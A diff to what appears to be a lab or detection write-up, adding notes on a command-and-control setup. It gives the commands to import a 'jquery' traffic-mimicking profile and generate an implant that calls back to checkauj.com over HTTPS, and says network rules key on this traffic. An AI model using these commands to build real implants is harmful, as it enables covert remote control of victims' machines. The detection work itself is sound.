@@ -82,3 +82,14 @@ callback cadence is part of the observable behaviour.
 | HTTP path | `curl -k https://checkauj.com/jquery-3.3.1.min.js` | served by the listener, not the nginx 404 |
 | Beacon callback | `sessions` in the console | session with the expected hostname |
 | Fallback failure | `nslookup volga.azureedge.net` on WS01 | non-existent domain |
+
+## Profile in use
+
+The listener in the recorded run is HTTPS on 443 with a self-signed certificate for `checkauj.com`,
+and the implant is generated against the `jquery` profile: request paths `jquery-3.3.1.min.js` and
+`jquery-3.3.2.min.js`, no nonce and no URL parameters. The profile is imported with
+`c2profiles import -f profile.json -n jquery` and selected at generation time with
+`--http https://checkauj.com:443 --c2profile jquery`.
+
+A session established with this configuration reports transport `http(s)` and holds a connection to
+port 443, which is what the network rules key on.
